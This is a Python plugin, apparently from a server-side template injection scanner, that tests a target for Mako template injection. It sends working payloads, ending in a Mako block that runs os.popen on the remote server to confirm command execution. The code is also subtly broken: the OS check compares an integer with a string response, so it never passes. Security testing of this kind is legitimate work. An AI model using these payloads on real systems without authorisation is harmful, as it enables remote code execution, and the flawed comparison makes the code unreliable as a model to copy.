from plugins.generic.check import Check
from utils.loggers import log
import random
import string

class Mako(Check):
    
    def init(self):
        
        if not self._check_reflection():
            return
            
        log.warn('Found reflection')
        self.state['reflection'] = True
            
        if not self._check_python():
            return
            
        log.warn('Found python injection')
        self.state['language'] = 'python'
        self.state['engine'] = 'mako'    
        
        if not self._check_os():
            return
            
        log.warn('Found OS execution')
        self.state['language'] = 'python'
        self.state['engine'] = 'mako'  
    
    def _check_python(self):
        
        randA = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))
        randB = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))
        
        payload = '${"%s".join("%s")}' % (randA, randB)
        expected = randA.join(randB)
        
        return expected == self.channel.req(payload)
    
    def _check_reflection(self):
        
        rand = random.randint(1, 10)
        payload = '${%i*%i}' % (rand, rand)
        expected = str(rand*rand)
        
        return expected == self.channel.req(payload)
        
    def _check_os(self):
        
        expected_rand = random.randint(999, 10000)
        payload = """<%%
        import os
        x=os.popen('echo %i').read()
        %%>
        ${x}""" % expected_rand
        
        return expected_rand == self.channel.req(payload)
    
        
        